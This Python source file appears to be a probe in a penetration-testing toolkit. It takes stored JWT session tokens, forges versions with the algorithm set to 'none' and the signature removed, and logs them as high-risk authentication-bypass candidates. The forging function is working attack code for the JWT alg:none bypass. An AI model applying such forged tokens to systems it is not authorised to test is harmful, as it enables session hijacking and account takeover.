"""JWT None Algorithm bypass probe.

用法（probe_runner.py 调用）:
  python jwt_none_alg.py --target "目标名" --db "/path/to/db"
"""

import argparse
import base64
import json
import sqlite3
import sys
from pathlib import Path

_TOOLS_DIR = Path(__file__).resolve().parent.parent.parent
sys.path.insert(0, str(_TOOLS_DIR))


def forge_none_token(original_token: str) -> str | None:
    """将 JWT 的算法改为 none 并去掉签名。失败返回 None。"""
    try:
        parts = original_token.split(".")
        if len(parts) != 3:
            return None
        header_json = json.loads(base64.b64decode(parts[0] + "=="))
        header_json["alg"] = "none"
        new_header = base64.b64encode(json.dumps(header_json, separators=(",", ":")).encode()).rstrip(b"=").decode()
        return f"{new_header}.{parts[1]}."
    except Exception:
        return None


def run(target: str, db_path: str) -> int:
    """从 auth_sessions 读 JWT，构造 none-alg 变种，写 suspicious_points。"""
    conn = sqlite3.connect(db_path)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA busy_timeout=5000")

    jwt_rows = conn.execute(
        "SELECT token_value, domain FROM auth_sessions "
        "WHERE is_active=1 AND (token_name LIKE '%token%' OR token_name LIKE '%jwt%' OR token_name LIKE '%auth%')"
    ).fetchall()

    if not jwt_rows:
        print("[jwt_none_alg] 未找到 JWT token，跳过")
        conn.close()
        return 0

    added = 0
    for token_value, domain in jwt_rows:
        forged = forge_none_token(token_value)
        if not forged:
            continue
        sp_id = f"SP-JWT-{domain.replace('.', '-')[:20]}-none"
        evidence = f"original={token_value[:40]}... forged={forged[:40]}..."
        conn.execute(
            """INSERT INTO suspicious_points
               (id, url, param, method, test_type, evidence, source, reasoning, risk, test_status)
               VALUES (?, ?, 'Authorization', 'GET', 'auth_bypass',
                       ?, 'jwt_none_alg', 'JWT alg:none bypass candidate', 'High', 'untested')
               ON CONFLICT(id) DO NOTHING""",
            (sp_id, f"https://{domain}/", evidence),
        )
        added += conn.execute("SELECT changes()").fetchone()[0]

    conn.commit()
    conn.close()
    print(f"[jwt_none_alg] 写入 {added} 条 suspicious_points")
    return added


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--db", required=True)
    args = parser.parse_args()
    sys.exit(0 if run(args.target, args.db) >= 0 else 1)


if __name__ == "__main__":
    main()
